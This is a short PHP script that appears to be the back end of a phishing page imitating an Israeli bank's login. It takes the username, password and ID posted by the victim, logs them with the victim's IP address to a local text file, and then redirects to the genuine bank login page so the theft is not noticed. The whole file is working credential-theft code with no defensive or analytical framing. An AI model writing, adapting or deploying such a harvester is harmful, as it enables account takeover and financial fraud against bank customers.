<?php

$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$bilsmg = "------------------------------------------------------\n";
$bilsmg .= "----------------Quzmar----------------\n";
$bilsmg .= "Username       : ".$_POST['aidnum']."\n";
$bilsmg .= "pass          : ".$_POST['tzPassword']."\n";
$bilsmg .= "ID          : ".$_POST['tzId']."\n";
$bilsmg .= "--------------------------------------------------------\n";
$bilsmg .= "From : $ip \n";

$file = fopen("CC-norge.txt", 'a');
fwrite($file, $bilsmg);



header("Location: https://start.telebank.co.il/login/#/LOGIN_PAGE"); /* Redirect browser */

/* Make sure that code below does not get executed when we redirect. */
exit;

?>